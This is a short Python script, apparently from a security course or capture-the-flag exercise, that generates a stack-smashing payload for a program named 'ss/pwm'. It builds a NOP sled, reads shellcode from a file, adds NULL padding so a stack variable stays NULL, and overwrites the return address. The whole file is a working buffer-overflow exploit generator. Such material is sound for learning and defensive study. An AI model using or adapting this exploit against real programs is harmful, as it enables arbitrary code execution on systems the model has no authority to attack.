#! /usr/bin/python3
# Stack-smashing exploit for ss/pwm.
# Pads with NULL bytes so the local `pwm` variable on the stack stays NULL,
# allowing "quit" to cleanly exit the while(1) loop and trigger the ret.
import sys, struct, os

if len(sys.argv) != 5:
    print("Usage: " + sys.argv[0] + " shell_code_file address fp_offset nop_sled_length")
    exit(1)

shellcode_file = sys.argv[1]
address = struct.pack('l', int(sys.argv[2], 16))
fp_offset = int(sys.argv[3])
nop_sled_length = int(sys.argv[4])

with open(shellcode_file, mode='rb') as f:
    shell_code = f.read()

padding_length = fp_offset - len(shell_code) - nop_sled_length + 8

if padding_length < 0:
    print("Invalid length parameters!")
    exit(1)

nop_sled = b"\x90" * nop_sled_length
padding = b"\x00" * padding_length

fp = os.fdopen(sys.stdout.fileno(), 'wb')
fp.write(nop_sled + shell_code + padding + address + b'\n')
exit(0)
